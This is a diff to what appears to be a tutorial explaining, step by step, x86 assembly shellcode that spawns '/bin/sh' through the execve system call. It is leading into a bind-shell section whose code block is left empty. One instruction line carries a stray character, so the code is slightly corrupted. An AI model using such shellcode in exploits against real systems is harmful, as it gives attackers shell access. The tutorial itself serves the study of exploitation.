@@ -312,19 +312,44 @@ pathname must be either a binary executable, or a script starting with a line of
   
 argv is an array of argument strings passed to the new program.  By convention, the first of these strings (i.e., argv[0]) should  contain  the  filename associated  with  the file being executed.  envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. 
 The argv and envp arrays must each include a null pointer at the end of the array.
-  
+
+First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then "/bin/sh" in reverse order. Additinal remark, since "/bin/sh" takes 7 bytes, we can add another slash to have 8 bytes "//bin/sh" and avoid null bytes. 
+In order to push null byte to stack, we need to zero-out EAX and push it to stack:
+
 ```
-xor eax, eax
-push eax
-push 0x68732f6e
-push 0x69622f2f
-
-mov ebx, esp
-push eax
-
-mov edx, esp
-push ebx
-
-mov ecx, esp
-mov al, 0x0b
+XOR EAX, EAX
+PUSH EAX
 ```
+
+After that, we need to push "//bin/sh"
+```
+PUSH 0x68732f6E
+PUSH 0x69622f2F
+```
+
+Then we need to place pointer to beggining of stack to EBX. ESP is pointing to the beggining of the stack and put null pointer by pushing EAX to the stack.
+```
+MOV EBX, ESP
+PUSH EAX
+MOV EDX, ESP
+```
+
+ECX should point to the location of EBX so we can push EBX to the stack and move ESP which points to the top of the stack to EXC and finaly load execve syscall number to EAX (AL).
+```
+PUSH EBX
+MOV ECX, ESP
+MOV AL, 0x0Bž
+INT 0x80
+```
+
+## Bind shell code ##
+
+So when we put it all together and add sections and entry point the result is following:
+
+```
+
+
+
+
+```
+
